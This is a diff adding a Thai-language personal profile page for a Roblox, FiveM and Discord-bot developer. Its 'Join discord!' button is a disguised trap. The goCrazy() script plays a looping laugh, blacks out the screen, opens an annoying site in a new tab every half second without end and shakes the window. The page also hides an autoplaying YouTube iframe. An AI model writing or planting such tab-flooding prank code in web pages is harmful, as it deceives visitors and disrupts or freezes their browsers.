@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Six</title>
+  <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Prompt', sans-serif;
+    }
+    body {
+      position: relative;
+      color: white;
+      background-color: #000;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow-x: hidden;
+    }
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: url('https://cdn.discordapp.com/attachments/1308774142451122209/1378782298601685155/IMG_7028.GIF') no-repeat center center/cover;
+      opacity: 0.3;
+      z-index: -1;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.12);
+      padding: 2rem;
+      border-radius: 20px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      max-width: 400px;
+      animation: fadeIn 1s ease-in-out;
+      backdrop-filter: blur(10px);
+      z-index: 1;
+    }
+    .avatar {
+      width: 120px;
+      height: 120px;
+      object-fit: cover;
+      border-radius: 50%;
+      margin-bottom: 1rem;
+      border: 3px solid white;
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 0.5rem;
+    }
+    p {
+      color: #cbd5e1;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    .buttons a {
+      display: inline-block;
+      margin: 0 0.5rem;
+      padding: 0.5rem 1.2rem;
+      border-radius: 8px;
+      text-decoration: none;
+      color: white;
+      background: #0636d4;
+      transition: background 0.3s;
+      cursor: pointer;
+    }
+    .buttons a:hover {
+      background: #0813b2;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .fade-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: black;
+      opacity: 0;
+      transition: opacity 1s ease-in-out;
+      z-index: 999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      color: white;
+      font-size: 2rem;
+      pointer-events: none;
+    }
+    .fade-overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+  </style>
+</head>
+<body>
+
+<!-- เพลงพื้นหลัง (ซ่อน) -->
+<div style="position: absolute; width: 0; height: 0; overflow: hidden;">
+  <iframe 
+    width="0" height="0"
+    src="https://www.youtube.com/embed/kgx4WGK0oNU?autoplay=1&loop=1&playlist=kgx4WGK0oNU"
+    frameborder="0"
+    allow="autoplay"
+    allowfullscreen>
+  </iframe>
+</div>
+
+<!-- เนื้อหาหลัก -->
+<div class="card">
+  <img class="avatar" src="https://cdn.discordapp.com/attachments/1308774142451122209/1378782298601685155/IMG_7028.GIF" alt="Avatar">
+  <h1>Six <span style="color:#2b41ff">Txnt</span></h1>
+  <p>Lua Html Css Java Python | Roblox System Fivem System Discord Bot</p>
+  <div class="buttons">
+    <a onclick="goCrazy()">Join discord!</a>
+  </div>
+</div>
+
+<div class="fade-overlay" id="fadeOverlay">
+  <div>ว้าย!!</div>
+</div>
+
+<audio id="crazySound" src="https://www.myinstants.com/media/sounds/lungering.mp3" preload="auto" loop></audio>
+
+<script>
+  function goCrazy() {
+    // เล่นเสียงหัวเราะ
+    const sound = document.getElementById('crazySound');
+    sound.play();
+
+    // แสดง fade overlay
+    const overlay = document.getElementById('fadeOverlay');
+    overlay.classList.add('active');
+
+    // เปิดแท็บใหม่ทุก 500 มิลลิวินาที
+    setInterval(() => {
+      window.open("https://theannoyingsite.com/", "_blank");
+    }, 500);
+
+    // เด้งหน้าต่างแบบ YouAreAnIdiot
+    setInterval(() => {
+      window.moveBy(30, 30);
+      window.moveBy(-30, -30);
+    }, 100);
+  }
+</script>
+
+</body>
+</html>
